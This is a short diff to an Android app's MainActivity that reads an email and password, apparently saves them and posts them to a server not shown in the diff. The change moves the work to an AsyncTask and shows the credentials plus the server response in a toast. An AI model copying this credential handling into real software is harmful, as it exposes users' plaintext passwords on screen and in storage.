@@ -3,6 +3,7 @@ package com.erza.braculogger;
 import androidx.appcompat.app.AppCompatActivity;
 
 import android.content.SharedPreferences;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
@@ -16,7 +17,7 @@ import okhttp3.Request;
 import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
-    private  String logTag = "Edebug";
+    private final String logTag = "Edebug";
     private Button btn;
     private EditText mailbox;
     private EditText passbox;
@@ -28,10 +29,12 @@ public class MainActivity extends AppCompatActivity {
         Toast.makeText(getApplicationContext(), txt, Toast.LENGTH_LONG).show();
     }
 
-    class postMan implements Runnable{
+
+    class postMan extends AsyncTask<Void,Void,String>{
 
         @Override
-        public void run() {
+        protected String doInBackground(Void... voids) {
+
             String mail = mailbox.getText().toString();
             String pass = passbox.getText().toString();
 
@@ -60,11 +63,14 @@ public class MainActivity extends AppCompatActivity {
             memEdit.commit();
             try {
                 Response response = signal.newCall(request).execute();
-                Log.i(logTag, mail+","+pass);
-                Log.i(logTag, response.body().string());
+                return mail+","+pass+"n"+response.body().string();
             } catch (Exception e) {
-                Log.i(logTag, "Fail: " + e.toString());
+                return e.toString();
             }
+        }
+        @Override
+        protected void onPostExecute(String result){
+            toast(result);
         }
     }
 
@@ -78,7 +84,7 @@ public class MainActivity extends AppCompatActivity {
             if(mail.isEmpty() || pass.isEmpty())
                 toast("Please fill first!!!");
             else
-                new Thread(new postMan()).start();
+                new postMan().execute();
         }
     }
 
